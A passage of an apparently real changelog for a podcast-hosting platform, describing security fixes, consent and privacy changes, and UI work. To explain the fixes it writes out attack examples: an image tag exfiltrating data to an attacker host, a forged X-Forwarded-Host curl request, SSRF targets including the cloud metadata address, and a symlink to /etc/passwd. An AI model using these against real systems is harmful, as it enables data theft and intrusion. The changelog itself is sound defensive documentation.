  above `writableBy` could overwrite or delete any shared-scope key — a value the plugin's own backend
  computed included, because the host cannot tell a scheduled write from a `curl`. A security audit
  demonstrated it against the bundled sample: a podcaster `PUT` a forged site-wide aggregate, it was served
  to every visitor, and then they deleted it. The plugin was not misconfigured — it declared
  `readableBy: anonymous`, `writableBy: podcaster`, both did exactly what they say, and there was no way to
  express "this key is the backend's".
  - The manifest declares `"data": { "backendOwned": ["stats", "agg:*"] }` — an exact key, a `*`-terminated
    prefix, or the bare `*`. A client `PUT`/`DELETE` to a matching key is **403**; **reads are untouched**
    and still governed by `readableBy`, since the point is to publish a value, not to hide it.
  - Its own problem type, **`problems/backend-owned-key`**, distinct from the role-floor
    `problems/forbidden`. The two refusals have opposite fixes — raise the floor, or stop writing the key
    from the client — so an author who cannot tell them apart is stuck. The role floor is still checked
    first: `data` is not in the public manifest, so a caller *below* the floor learns nothing about which
    keys it names.
  - **`ctx.store()` is unaffected.** Enforcement is HTTP-side only; the `DocStore` interface did not change.
  - **Ignored for `USER` scopes**, even under a bare `*`: a backend cannot write a partition there at all, so
    reserving one would reserve it for nobody and lock its owner out of their own data.
  - Matching is by key, case-sensitive, across every shared scope — one declaration covers an aggregate at
    site level and a counter at episode level. A malformed entry **rejects the plugin at load** rather than
    being dropped, because a dropped entry loads a plugin whose manifest claims a key is the backend's while
    the host enforces nothing.
  - It does **not** remove a value a client wrote before the declaration existed, so write your computed keys
    in `register(ctx)` as well as on a schedule — otherwise a forged document survives until the next tick.
  - **Requires SDK 0.6.0** (`platformApi` 0.6.x).
  - **Still open:** everything else in a shared scope has no owner, so one podcaster can overwrite another's
    plugin data. Binding a shared document to its author needs an ownership concept the domain model does not
    have; until then, reserve the key or keep the data in `USER` scope.
- **`POST /api/auth/dev-login` is CSRF-protected like every other mutation (`0.6.1`).** It was exempt under
  the `dev` profile, on the reasoning that the endpoint only exists there — but a dev instance is where a
  session is worth the most, since dev-login mints an ADMIN one on request with no password to phish. A
  cross-site page could drop a developer's own browser into a Dev ADMIN session. The SPA already sent the
  header on every unsafe method, so the exemption bought nothing.
- **`mosaicast.feed.allow-private-targets` needs a second key (`0.6.1`).** It disables the SSRF egress filter
  entirely and did so with a WARN nobody reads. With it on and
  `mosaicast.feed.allow-private-targets-confirmed` off, **the app refuses to start**. One variable is too
  easy to set while chasing something else and leave behind, and the failure is silent — everything keeps
  working, and the only difference is that the filter is gone.
- **CSP image and media sources can be narrowed (`0.6.1`, §12.5).** `img-src 'self' data: https:` allows an
  image from any host, so `<img src="https://attacker/p.gif?d=…">` is a working one-way exfiltration and
  tracking channel — past `connect-src 'self'` and past consent, which gates script/frame/connect and never
  touched this. `mosaicast.security.strict-media-sources` replaces the blanket with the origins the site's
  content actually references (derived from feed and episode artwork/audio, refreshed every fifteen minutes)
  plus the plugin hosts this visitor consented to; `mosaicast.security.extra-media-sources` covers what a
  derivation cannot see. **Off by default** — artwork comes from whatever host a feed points at, and
  narrowing too far shows a blank tile rather than an error.
- **Per-user plugin data is no longer reachable by anyone but its owner (`0.6.0`, §7.4/§7.6).** The doc store
  had no notion of *whose* a document was: `scopeType`, `scopeId` and `key` were all client input, the only
  gate was a per-plugin role floor, and scope ids are public slugs — so any caller above that floor could
  read, overwrite or delete another user's key, with nothing to guess. The SDK made it concrete by telling
  authors to put the user id *in the key* (`mark:<userId>:cell`), which is an access-control decision placed
  exactly where the host cannot check it.
  - **`USER` scope, host-owned.** Addressed as `user/me`; the server substitutes the session's user. Another
    person's partition is not forbidden, it is **unnameable** — no request expresses it. Any other `user` id
    is a **400**, never a silent substitution, and an anonymous one a **401**.
  - **Neither access floor applies to it** (§7.6). A floor governs the shared scopes, where one caller's write
    overwrites another's; a user partition has nobody to protect. So a fan marks their own card under a plugin
    declaring `writableBy: "podcaster"` for its shared scopes — gating that would force the plugin to open its
    shared scopes to fan writes to make its own feature work.
  - **A backend cannot use it.** No calling user exists on a scheduled task or in `register(ctx)`, so all four
    `DocStore` methods throw `UnsupportedOperationException` — reads included, since resolving "me" without a
    caller means picking someone. Aggregates go through the new backend-only `queryAcrossUsers`, which names
    each owner and has no HTTP surface.
  - **Requires SDK 0.5.0** (`platformApi` 0.5.x). Existing per-user data stays in whatever keys hold it —
    the host cannot know a plugin's key convention — so plugins migrate it themselves.
- **A plugin's data surface declares its own access floors (`0.6.0`, §7.2).** They were derived from slot
  `visibleTo`, taking the *minimum* across all slots as the read floor, so a plugin with one anonymous display
  slot served its entire doc store anonymously — including whatever an admin-only slot had written. Which UI
  regions a plugin mounts into says nothing about who may read its data. The manifest now declares
  `"data": { "readableBy", "writableBy" }`; slot `visibleTo` governs rendering only.
  - **Breaking for existing plugins.** An absent block defaults `readableBy` to the **write** floor, not to
    anonymous, so a plugin that relied on an anonymous slot making its data public must now say
    `"readableBy": "anonymous"`. Saying nothing gets the closed answer.
  - `writableBy: "anonymous"` is refused at load: a write with no owner has nothing to attribute or
    rate-limit.
- **An unauthenticated controller path returns 401 instead of 500 (`0.6.0`).** `ExceptionTranslationFilter`
  turns an `AuthenticationException` into a 401 only once it escapes the dispatcher, and `@ControllerAdvice`
  runs first — so the catch-all handler reported "you are not signed in" as "the server broke".


- **Branding uploads are identified by their bytes, not by a header the client wrote (`0.5.18`, §12.2).**
  This class promised "only raster is stored" and checked only `getContentType()`, so an SVG labelled
  `image/png` was accepted, stored, and served back with that same attacker-chosen type — containment resting
  entirely on a `nosniff` header set in a different file. Magic numbers now decide, and the sniffed type is
  what gets stored, so what is served is what was actually uploaded.
- **`sitemap.xml` is built from `mosaicast.base-url`, not from the request (`0.5.18`, §6.6).** It used
  `fromCurrentContextPath()`, and with `forward-headers-strategy: framework` that makes `X-Forwarded-Host`
  authoritative — so `curl -H 'X-Forwarded-Host: evil.example' /sitemap.xml` returned a sitemap whose every
  `<loc>` pointed at the attacker's host. Handed to a crawler, that reassigns the site's canonical URLs. The
  shipped compose file exposes the app port directly, with no proxy to strip the header. `mosaicast.base-url`
  was already configured and read nowhere.
- **Plugin assets no longer follow a symlink out of the plugin (`0.5.18`, §7.4).** The traversal check was
  lexical while `isRegularFile` and `readAllBytes` follow links, so a package containing
  `assets/logo.png -> /etc/passwd` was served. Containment is now checked against `toRealPath()`. A link
  within `assets/` still works.
- **A plugin cannot take over another plugin's identity (`0.5.18`, §7.2).** The registry is keyed on the id
  a plugin declares about itself and `put` silently overwrote, so a package installed as `zz-analytics/`
  declaring `"id": "bingo"` served its bundle from `/plugins/bingo/assets/**`, gated `bingo`'s data surface
  with its own `visibleTo` floors, and shared `bingo`'s `plugin_data` namespace. The manifest id must now
  match the folder the operator installed it into.
- **Feed HTML is sanitized against an explicit allow-list (`0.5.18`).** DOMPurify's defaults stop script
  execution and permit `<style>` and `style`; with `style-src 'unsafe-inline'` in the policy, show notes from
  a podcast host were a working stylesheet — attribute-selector exfiltration of rendered values, and
  full-page click-jacking overlays, with `img-src https:` permitting the outbound request that carries the
  stolen data. `'unsafe-inline'` stays, because plugin Web Components style their shadow roots and dropping it
  breaks the plugin UI contract; the sanitizer closes the path instead. The reasoning is now written down in
  `PluginCspHeaderWriter` rather than left as an unexplained relaxation.
- **Personal access tokens expire and are capped (`0.5.18`, §8.5).** A token was valid until someone
  remembered to revoke it, and a user could mint any number. Since a token carries whatever role its owner
  holds *now*, promoting a podcaster to admin retroactively upgraded every token they had ever created. New
  tokens get a lifetime (`mosaicast.security.pat-lifetime-days`, default 365) and there is a per-user cap
  (`pat-max-per-user`, default 20). Existing tokens keep no expiry — retrofitting one would break running
  automation on a date nobody chose.
- **The `XSRF-TOKEN` cookie gets `SameSite=Lax` and `Secure` (`0.5.18`).** `HttpOnly=false` is the design —
  the SPA reads it — but Spring's defaults left the other two unset. Depth rather than the load-bearing
  control, and it now matches the session cookie instead of travelling under different rules.

### Changed

- **The plugin log rate limiter decides atomically (`0.5.18`).** A `compute` followed by a separate `put` is
  two atomic operations and therefore not one: concurrent callers could each emit the "being throttled"
  notice, and a thread caught between the two while the window rolled over wrote its stale start time and
  inflated count over the fresh window, silencing the plugin for an extra minute.
- **CI checks SPDX headers on CSS, SQL, shell, YAML and properties files, and checks the copyright line
  (`0.5.18`).** The glob covered Java/Kotlin/JS/TS only, which is why a release adding nine CSS partials and
  two SQL migrations passed unchecked, and only `SPDX-License-Identifier` was ever verified — so a file could
  satisfy CI with half the convention.


- **A plugin can no longer declare itself exempt from consent (`0.5.16`, §12.5).** A service declaring
  `"category": "necessary"` was kept out of the visitor's toggle list and had its origins added to every
  visitor's CSP unconditionally — on the strength of a string in a file the plugin author wrote, checked
  only for being non-blank. A tracker declaring itself necessary loaded for everyone, was never prompted and
  could not be refused, which is the premise of the consent system rather than an edge of it. The claim is now
  a **proposal**: until an admin approves it in Admin → Consent, the service is offered as an ordinary
  prompted category (`unreviewed`) and a refusal keeps its origins out of the policy. Approval is bound to a
  digest of the origins and storage that were on screen, so a plugin update that adds either drops back to
  prompted rather than inheriting the old decision.
- **Turning off "remember where I stopped" now applies to signed-in listeners (`0.5.16`, §6.5).** The local
  read was gated and the server read was not, so someone signed in still resumed exactly where they left off;
  `onEnded` wrote a position with no gate at all; and withdrawal cleared `mc.progress.*` locally while no
  endpoint existed to clear the server rows — which the settings page nonetheless said were deleted. All
  three paths are gated, and `DELETE /api/me/progress` erases the caller's stored positions.


- **A plugin doc-store scope must now name something that exists (`0.5.15`, §7.6).** `scopeId` went straight
  from the request path into the store's primary key, so any string at all opened a fresh partition —
  invisible to every admin surface, unbounded in number, and corresponding to no feed, season or episode.
  Addressing a scope is now at least a claim that it exists; anything else is a 404. Legitimate traffic is
  unaffected, because a plugin UI is always mounted on a scope the host itself resolved.
  - **This does not close the doc store's authorization gap, and the code now says so.** Access is decided per
    *plugin*, never per *document*: any caller clearing the plugin's role floor can read, overwrite or delete
    any key in any scope, including keys another user's session wrote. With no user-level scope in the
    contract, the SDK tells plugin authors to model per-user data inside the key
    (`mark:<userId>:cell`) — and the host has never checked that `userId` against the caller. Closing it needs
    a partition the client cannot address, which is a plugin-contract change (§7.3 fixes the scope tuple at
    site/feed/season/episode) and is tracked separately. The javadoc on `PluginDataController` and
    `PluginAccessPolicy` previously implied a stronger guarantee than either delivers; it now states the
    limit plainly.

- **A feed URL can no longer point the server at its own network (`0.5.15`, §5.1).** `validateHttpUrl`
  checked the scheme prefix and nothing else, so `POST /api/admin/feeds/preview` fetched
  `http://169.254.169.254/latest/meta-data/`, `http://127.0.0.1:<port>/` or any RFC-1918 address and — because
  preview returns the channel title and first ten item titles — **read the response back to the caller**. The
  endpoint is open to PODCASTER, not only ADMIN. The new `OutboundTargetPolicy` resolves the host and requires
  every address it answers with to be publicly routable: loopback, link-local, RFC-1918, carrier-grade NAT,
  IPv6 unique-local, multicast, reserved ranges and IPv4-mapped disguises of all of them are refused before a
  connection is opened. `mosaicast.feed.allow-private-targets` turns the check off for a self-hosted install
  that legitimately fetches from its own LAN; it defaults to off.
  - **Redirects are followed by hand and re-checked on every hop.** `HttpClient.Redirect.NORMAL` refuses only
    an HTTPS→HTTP downgrade, so a chain starting on `http://` was followed anywhere at all — an
    attacker-controlled public host 302ing into `127.0.0.1` bypassed any front-door check by construction.
  - **Every rejection reads the same.** The distinct messages for "not RSS", "connection refused" and
    "HTTP 403" composed into a working internal port scanner; the detail now goes to the log, not the caller.
  - Not closed: resolution and connection are separate lookups, so DNS rebinding remains possible. Pinning the
    connection to the checked address is not something the JDK's `HttpClient` exposes — an install that needs
    that guarantee wants an egress proxy.
- **A feed can no longer exhaust heap or hold a request thread indefinitely (`0.5.15`).** The body was read
  with `BodyHandlers.ofByteArray()` — no cap — and then parsed into a JDOM tree several times its size again;
  the audit pushed 200 MB through and had all of it parsed. Bodies are now capped at 16 MB, refused up front
  on an oversized `Content-Length` and cancelled mid-stream when a chunked response passes the cap. A
  wall-clock budget covers the whole exchange, including the body: `HttpRequest.timeout` bounds the wait for a
  *response*, which a host that answers promptly and then dribbles one `<item>` per second satisfies forever
  (the audit held a thread past 75 seconds that way).


- **A feed poll no longer holds a database connection across the network call (`0.5.15`, §5.4).** `poll` ran
  as one transaction: lock the `feed` row, then fetch, then reconcile — pinning a pooled connection and the
  row lock for the whole round-trip. Eight "Refresh now" clicks against a slow host exhausted HikariCP's
  default pool of ten and the next public page load returned a 500. The fetch now happens between two short
  transactions (`FeedPollStore`). Two concurrent polls of the same feed can both fetch as a result; they still
  serialise on the reconcile and the reconciler keys on the item GUID, so the second updates what the first
  inserted.
- **`GET /api/plugins/scope-episodes` is paginated (`0.5.15`, §7.5).** It is anonymous and was
  `Pageable.unpaged()`, so `?type=site&id=main` materialised every visible episode plus its `episode_display`
  JSONB on every request, with no auth and no cost to the caller. It now caps at 200 like every other list
  surface and accepts `page`/`size`. The in-process `FeedAccess.episodesIn` contract is unchanged — a plugin
  resolving a scope still gets all of it.


- **A refusal is now enforced, not just promised (`0.5.13`, ARCHITECTURE §12.5, §13)** — `ctx.consent.has()`
  is advisory and always will be: a plugin bundle is imported into the page's own JavaScript realm, shadow
  DOM encapsulates styles and markup rather than capabilities, and nothing running in that realm can take
  `fetch` away from a plugin that declines to ask. The CSP is the part a plugin cannot talk its way past —
  and it was written blind, allowing every declared origin whatever the visitor had chosen.
  - **The decision now reaches the server.** It is mirrored into an `mc_consent` cookie (dot-separated
    categories, `SameSite=Lax`), so `PluginCspHeaderWriter` narrows `script-src`/`frame-src`/`connect-src`
    to the categories actually granted. No cookie means nothing optional — the same default-deny the client
    applies. A plugin that ignores `has()` now gets a blocked request instead of a silent one.
  - `necessary` services survive every decision, because they are never offered as one. A forged category
    widens nothing: the manifest decides which origins exist, the cookie only which of them apply.
  - **`Vary: Cookie` only when it earns its keep** — added when some declared service is actually gated. On a
    site where everything is `necessary` the policy is identical for everyone, and varying would cost
    cacheability for nothing.
  - **Honest about the limits.** The cookie is visitor-controlled, which is not a hole (it can only widen
    that visitor's own policy, and CSP protects exactly that visitor). It is not absolute containment against
    a determined plugin either — same origin, so it could forge the value and wait for a navigation. It makes
    a refusal take effect at the network layer for the whole of the current page, and turns evasion into a
    deliberate, detectable act. Real containment means an iframe per plugin, which is an architecture
    decision, not a patch. `img-src`/`media-src` stay open to `https:` because episode artwork comes from
    arbitrary feed hosts; closing that channel needs an image proxy.
  - **Withdrawal now reaches the data, not just the next request.** After every decision — and on load, for
    a plugin uninstalled while the visitor was away — the shell sweeps `localStorage`, `sessionStorage` and
    the cookies script can see down to what core declared, what a `necessary` service declared, and what the
    visitor granted. Everything else goes, including keys no manifest ever mentioned. Blocking a *write* is
    hopeless in one JavaScript realm (a patched `setItem` is one same-origin iframe away from being
    bypassed); deleting needs no cooperation from whoever wrote it, because the shell owns the origin too.
    The CSP closes the future, this closes the past — which is what Art. 17 and "as easy as granting" ask
    for. Limits stated in `purge.ts`: `HttpOnly` cookies are the server's business, cookie scopes that
    cannot be guessed survive, and IndexedDB is not swept yet.
  - The consent record, its cookie and the playback-position switch can never be swept, whatever a payload
    says. A sweep able to erase the decision it is enforcing is a loop, not a rule.
  - **`necessary` services are now disclosed to visitors**, in their own read-only block under "Always
    active". They were declared, allowed by the CSP and visible to an operator, but a visitor was told
    nothing about them — and §25 TDDDG asks for the disclosure whether or not a decision is attached.
  - **Dev-profile storage audit:** the shell warns when anything writes a storage key no manifest declared,
    naming the plugin bundle from the stack where it can. Detection, not containment — undeclared storage
    means the privacy settings are lying to visitors, and that is worth catching while developing.
  - **The core holds itself to the rule it wrote.** The audit used to exempt the whole `mc.` namespace, which
    hid `mc.prefs.rate` — written by the player, disclosed nowhere, for as long as `CoreStorageInventory`
    has existed. The exemption is gone, the key is declared, and a test now reads both sides and fails when
    the shell writes an `mc.` key the inventory does not list. That mattered less when the inventory was only
    a notice; now that it is also the allow-list, an omission is a key the shell deletes out from under
    itself.
  - The README now states plainly what is enforced and what is trusted: installing a plugin is a trust
    decision, in the sense a WordPress plugin is and a browser extension is not.

- **The shell is art-directed rather than merely laid out (`0.5.12`)** — every region, route and
  `data-slot` name is unchanged, because plugins target those; what changed is how it all looks, now that
  there are tokens to build on.
  - **Cards** lead with the artwork (168px), meta reads as chips instead of loose text, the title carries
    the type weight, and hovering lifts the card and lights an accent rail. Where this device got to in an
    episode is drawn along the bottom of the cover — read straight from `localStorage`, because thirty
    cards should not mean thirty requests to paint a 3px line.
  - **The detail hero is full-bleed**, with the episode's own artwork blurred behind its title and a
    gradient dissolving into the page. Each episode page now looks like *that* episode, from data the feed
    already provides. The sidebar region sticks while the notes scroll; prev/next are destinations rather
    than bare links.
  - **The player earns its bar:** ±15/30 s, a speed control cycling 1×–2× (remembered across episodes as
    `mc.prefs.rate`, disclosed with the rest), a scrubber that shows how far in you are, and **keyboard
    control** — space, arrows, `J`/`L` — bound at the document so it works wherever focus is, and standing
    down inside inputs and plugin shadow DOM so typing never seeks the audio.
  - **The season dropdown reads in the same direction as the list.** It ran All → 1 → 2 → 3 even with newest
    episodes on top, so the season most people want sat at the far end of the menu. It now follows the sort
    control, which also keeps the two from contradicting each other. Not ordered by "which season released
    most recently": a filter list that reshuffles itself when a feed updates is harder to use than one that
    is merely upside down.
  - **Loading and empty are states, not gaps:** card-shaped skeletons on first load so nothing jumps, and
    an empty feed that says what to try next.
  - Chrome, forms and admin moved onto the tokens: translucent top bar, a mobile-collapsing nav, hover and
    active states throughout, styled native selects, and **a disabled button that looks disabled** (an open
    note from the M4 review — a control that looks live and does nothing reads as a broken page).
  - **Feeds get readable URLs too.** Episodes have lived at `/episodes/the-sample-cast-s01e06` since `0.5.2`
    while their own show sat at `/feeds/7a48fcb5-0fe5-429e-a1b6-187002b35940`. A feed now has the same kind of
    slug, minted once at creation and never changed — a feed title comes from the feed and moves on any poll,
    so re-slugging would break every shared link.
    - It is the public identifier everywhere: URLs, `GET /api/feeds/{slug}` and its sub-resources, the
      `feedId` filter, the sitemap, and the plugin `feed` / `season` `scope.id`.
    - **Old links keep working.** Feed URLs were UUID-shaped until now, so the API resolves a UUID as well;
      no slug can parse as one, so there is no ambiguity.
    - **Existing plugin documents move with the feed.** `scope.id` is what partitions a plugin's doc store, so
      rows written under the old UUID would present as missing — indistinguishable from data loss to the
      plugin. `FeedSlugBackfill` mints the slugs and repoints `feed`- and `season`-scoped rows in the same
      transaction, before the plugin loader runs.
  - **Code:** `useResource` replaces the fetch/`useEffect`/`active`-flag triple that had been copied into
    fifteen components with subtly different failure behaviour, and a `MetaProvider` ends the duplicate
    `/api/meta` request that `TopBar` and `Footer` each made on every load.
  - README screenshots refreshed (home, detail, account, admin — light and dark).

- **Consent is now written for visitors (`0.5.11`, ARCHITECTURE §12.5)** — the declaration half shipped in
  `0.5.9`; this is the half people actually read. The old banner said *"An installed plugin wants to load
  content from third parties"* and listed `requested by: sample`, which is the site's architecture, not a
  question anyone can answer. It also rendered raw category slugs, and its settings link existed **only**
  when a plugin declared something — so a core-only install had no withdrawal surface at all, while still
  writing `mc.locale`, `mc.site`, `mc.progress.*` and `mc.consent` to the device.
  - **Visitors are told about services and companies.** Layer one names the providers involved and links the
    privacy page; the settings name each service, who operates it, whether data leaves the EU/EEA, and every
    item it stores with purpose and lifetime — from the manifest, so the notice cannot drift from what loads.
    The words *plugin*, *slot* and *manifest* do not appear in visitor-facing text, and the endpoint that
    feeds it has nowhere to put a plugin id.
  - **Allow and refuse are the same button in the same row.** A quieter reject is a dark pattern with a case
    history (DSK, Nov 2024; OLG Köln 2025), so both are the accent style and a test asserts the wording.
  - **One settings component in three places** — `/cookies`, appended below the legal page marked `privacy`,
    and inside the banner — because withdrawal has to be as easy as granting, and three near-identical
    surfaces are how that stops being true. The footer link is now **unconditional**.
  - **A stored answer can now stop counting.** `decided` used to be a single boolean, so a newly installed
    plugin silently inherited a decision taken before it existed. The record now carries `decidedAt` and the
    server's **declaration fingerprint**: change a provider, a host or even a cookie's lifetime and the
    fingerprint moves, so the question is asked again. Answers also expire after twelve months.
  - **Global Privacy Control is honoured** as a refusal — and, since it is an answer, without a banner. An
    explicit choice in the settings still overrides it.
  - **Playback position gets an off switch, not a consent gate.** It is first-party, local, never profiled
    and written only after a deliberate press of play, so gating it would trade a real feature for a fake
    choice. Switching it off also deletes the positions already stored, and the switch is on both the privacy
    settings and the account page (one shared component, so they cannot drift).
    **Under GPC it defaults to off**: on-by-default is defensible for a visitor who said nothing and not for
    one whose browser is asking sites not to track them — and a position that persists indefinitely is the
    part of the strictly-necessary exemption that covers a media player least well (WP29 Opinion 04/2012
    exempts *session* state). Switching it on stores an explicit choice, which outranks the signal.
  - **The receipt stays on the visitor's device** (`mc.consent`, readable and exportable from the settings).
    No server-side consent table: that would be a new store of personal data, with its own legal basis and
    retention, created to prove something about visitors who are anonymous here. The operator's half is
    **Admin → Consent** (`GET /api/admin/consent`) — every declared service attributed to its plugin, the
    resulting CSP allow-list, and the fingerprint.
  - **The core's own storage is generated, not written down.** `CoreStorageInventory` produces the "always
    active" list from constants, with purposes and durations travelling as i18n keys so the disclosure reads
    correctly in both locales. Flyway `V16` replaces the hand-written list in the seeded privacy page — which
    had already drifted, having never mentioned `mc.consent` — with a pointer to it, by targeted replacement
    so an operator's own edits to that template survive.

- **The shell has a design-token layer, and the stylesheet is split (`0.5.10`, ARCHITECTURE §12.3)** — the
  `--mc-*` custom properties are a contract with plugins, and until now that contract was eight colours.
  Everything else a plugin might want to match — spacing, radii, elevation, type scale, motion — did not
  exist, so a plugin author had two options: hard-code values that break in dark mode, or guess. The shell
  had the same problem from the inside: 1482 lines with two `transition`s, two `box-shadow`s and no focus
  ring worth the name.
  - **New tokens** in `frontend/src/styles/tokens.css`: surfaces and state layers (`--mc-surface-2`,
    `--mc-hover`, `--mc-active`, `--mc-accent-soft`, `--mc-border-strong`, `--mc-overlay`, `--mc-focus`),
    feedback colours, a space scale, radii, three elevations, a type scale, motion, and layout constants
    (`--mc-container`, `--mc-player-height`). The eight original colour names are untouched.
  - **Derived, not duplicated.** The seed generator only writes the eight colours at runtime, so every other
    colour token is a `color-mix()` over them. An admin dragging the accent moves the hover layer and the
    strong border with it, instead of leaving them at their light-theme defaults. Only the feedback colours
    and the shadow alphas — which cannot be derived and stay readable — are written per theme.
  - **Plugins get this for free**, because custom properties inherit across a shadow boundary. Only the eight
    colours are also delivered as JS (`ctx.theme`); everything else is CSS-only and needs no SDK bump. The
    token table is in the README under *Theming a plugin*.
  - **`styles.css` is now an `@import` manifest** over `styles/{tokens,base,chrome,feed,detail,player,forms,
    admin,consent}.css`. Rules moved verbatim — this is a split, not a restyle.
  - **Accessibility baseline:** one `:focus-visible` ring for every interactive element (declared on the
    elements, not a class, so a new surface inherits it), a 32px minimum target, `color-scheme` per theme,
    and `prefers-reduced-motion` honoured both through the motion tokens and as a catch-all.
- **Manifest `consent.services[]` (`0.5.9`, ARCHITECTURE §12.5):** the plugin consent declaration moves from
  category slugs plus bare hostnames to **named services**, matching what SDK `0.4.0` documents. Each service
  carries `name`, `provider` (the operating company), `category`, `privacyUrl`, `hosts`,
  `thirdCountryTransfer` and a `storage[]` list of what it puts on the device with purpose and lifetime.
  - **Why:** a notice that satisfies §25 TDDDG / Art. 5(3) ePD has to name each stored item, its purpose, its
    lifetime, its provider and whether data leaves the country. Slugs and hostnames cannot produce that, and
    they forced the notice to talk about "plugins" to visitors who care about cookies and companies.
  - **The legacy form is rejected at load**, with a message naming the replacement — a plugin that kept it
    would otherwise load with its consent declaration silently dropped, meaning no banner and no CSP origins
    for third parties it really does contact.
  - Validation also rejects a service with no name or category, and a **host without a scheme**: hosts double
    as CSP origins, and `plausible.example` is not an origin — it would never match, so the plugin's embeds
    would fail with consent granted and nothing to explain why.
  - `necessary` services are never asked about but still contribute their origins to the CSP and their
    storage to the disclosure — they load without being asked, so they must be allowed and disclosed.
  - Optional fields may be omitted (`thirdCountryTransfer` is boxed, because Jackson 3 refuses to map a
    missing value onto a primitive and would fail the parse before validation could explain anything).

- **Spring Boot 4.1, Jackson 3 and plugin contract `0.4.0` (`0.5.8`)** — one coordinated move, because each
  blocks the others: Boot 3.4 is past OSS support, Boot 4 defaults to Jackson 3, and SDK `0.4.0` types the
  contract on Jackson 3.
  - **Every `0.3.x` plugin is rejected at load until it declares `platformApi: "0.4.0"` and rebuilds.** The
    rejection is visible in **Admin → Logs & health** with its reason, which is why the log viewer shipped
    first. The bundled sample plugin is already migrated (`2.3.0`).
  - **JSONB keeps its exact encoding.** Hibernate detects Jackson by its old `com.fasterxml` package, so from
    Jackson 3 it finds no mapper at all and JSON columns break; core now ships
    `Jackson3JsonFormatMapper`. It deliberately writes temporal values as **numbers**
    (`"duration": 3134.000000000`, `"publishedAt": 1783231200.000000000`) exactly as the old mapper did —
    Jackson 3 would default to ISO-8601 strings and quietly leave the table holding two encodings of the same
    field. Proven against **real rows dumped from a 3.4.1 instance before the upgrade**, kept as fixtures in
    `src/test/resources/premigration/`.
  - **`ctx.logger()`** is implemented: plugins get an SLF4J logger the host names `plugin.<pluginId>`, so a
    plugin's own entries land in the admin viewer attributed to it — including from its own threads and
    scheduled tasks, where a thread-local MDC would arrive empty.
  - **Frontend `ctx`** matches the new contract: `log(level, message)` (routed to
    `POST /api/plugins/{id}/log`), `consent.granted()` / `consent.request(category)` for click-to-load, and
    every `onChange`/`player.on` now returns an **unsubscribe** — a plugin calling one inside a React effect
    uses that as its cleanup, so returning nothing would throw at unmount. `episodeLabels` is native on the
    SDK type now, so the host's intersection type is gone.
  - Build: `-starter-web` → `-starter-webmvc`, Flyway via its starter, Testcontainers 2 artifact names,
    `io.spring.dependency-management` replaced by importing the BOM, `TestRestTemplate` opted into with
    `@AutoConfigureTestRestTemplate`, and JSpecify annotations in place of Spring's removed `lang` ones.
  - **Not in this change:** the `SchemaStore` implementation (`schema()` still returns `null`, `storage:
    "schema"` still rejected) and the manifest `consent.services[]` shape. Until that lands, a plugin
    declaring the new consent form loads but contributes **no** consent categories and no CSP origins.


- **Consume plugin SDK `0.3.0`** (`0.4.7`): bumped `dev.mosaicast:plugin-api` / `plugin-testkit` and
  `@mosaicast/plugin-sdk` from `0.2.0` to `0.3.0` (the SDK's symmetric doc-store cut — `DocStore.delete`,
  keyed `query`, `DocStore.KEY_PATTERN`, `Scope.SITE_ID`/`Scope.site()`). The advertised `platformApi`
  version (footer "Powered by Mosaicast", `/api/meta`, player) therefore moves 0.2.0 → 0.3.0. No core
  behaviour change: core does not yet implement the plugin doc-store contracts, so the SDK's breaking
  backend changes have no effect here — M5 implements them.

### Fixed

- **Plugin documents follow their feed and episode slugs (`0.5.17`, §4.1, §7.6).** Feed and episode scope ids
  became public slugs, and `FeedAccessImpl` resolves either form — so a plugin still holding a UUID kept
  getting the right episode list and looked healthy, while the doc store partitioned on the raw string and
  sent its reads to an empty partition and its writes to a second one. Silent, and indistinguishable from
  data loss. Two changes, because either alone leaves a hole: `PluginScopeRepartition` moves rows that already
  exist — **including episode-scoped ones, which nothing ever moved** — and scope ids are canonicalised at the
  boundary so nothing diverges again. The old repartition also lived inside the feed backfill's per-feed loop,
  which returns early once every feed has a slug, so a document written under a UUID on any later boot was
  stranded permanently; the sweep now runs every boot. Where both spellings hold the same key the slug-keyed
  document wins and the stale one is left in place and reported, rather than overwriting current data with
  older data.
- **Slugs are minted before the HTTP port opens (`0.5.17`, §4.1).** Both backfills were `ApplicationRunner`s,
  which Spring Boot invokes *after* the web server starts, so an upgrade restart served `"slug": null` for a
  window: `Home` redirected to `/feeds/null`, `FeedTabs` rendered dead links, and `/api/feeds/null` 404'd —
  while `api/types.ts` declares `slug: string`, so TypeScript said it could not happen. They now run from
  `SlugBootstrap` during bean initialisation, before `finishRefresh` starts Tomcat. The public catalog also
  filters out any feed still lacking a slug, so the shell's types cannot be made false at runtime.
- **An unknown or disabled feed filter narrows the result instead of failing the request (`0.5.17`).**
  `GET /api/episodes?feedId=` and `GET /api/tags?feedId=` routed an *optional filter* through
  `resolvePublicId`, which throws `NotFoundException` — so both endpoints 404'd in their entirety the moment
  an admin disabled a feed someone held a filtered link to, where they had returned an empty page. The shell
  renders its load-error banner in place of the empty state, and any integration passing a `feedId` breaks
  outright. `/api/feeds/{ref}/episodes` and `/seasons` keep the 404: there the feed *is* the resource.
- **A privacy page can no longer claim no consent banner is required while showing one (`0.5.17`, §12.6).**
  V16 replaced a ~900-character passage with `replace()`, which needs a byte-exact match, but guarded on a
  single bullet line — so any operator edit elsewhere in the passage satisfied the guard while the replace
  matched nothing, and Flyway reported success. V19 repairs the affected pages by targeting the one false
  sentence rather than a passage, and guards on exactly the text it replaces.


- **A decision now takes effect on the page it was made on (`0.5.16`, §12.5).** Enforcement moved onto the
  per-request response CSP, and a document's CSP cannot be changed after delivery — so *Allow all* set the
  cookie while the plugin's script stayed blocked against the narrow policy already in force, and *Allow none*
  left the wide policy running for the rest of the session, contradicting the guarantee `ConsentCookie`'s own
  javadoc makes. Routing is client-side, so nothing would have re-requested the document. A decision that
  changes the policy now reloads; one that does not (re-saving the same answer, or toggling a category no
  service declares an origin for) does not, so nobody loses their place in an episode for nothing. The public
  payload gained `affectsPolicy` per category to make that distinction possible without exposing host lists.
- **The consent fingerprint no longer invalidates itself over something invisible (`0.5.16`).** `fingerprint()`
  hashed services that `current()` skips, appending the literal `"null"` for a blank category — so a change no
  visitor could see moved the digest, every stored answer stopped matching, granted categories fell out of the
  CSP, allowed storage was purged, and the banner re-asked a question already answered.
- **A plugin fronting a wildcard origin can be installed again (`0.5.16`).** `URI.getHost()` is null for
  `https://*.plausible.io` — `*` is not legal in a hostname — so validation rejected a legal CSP source, and
  because it runs before the backend starts, rejected the **entire plugin** while telling the author their
  valid origin was invalid.
- **A category that could never be granted is refused at load (`0.5.16`).** Nothing checked a declared
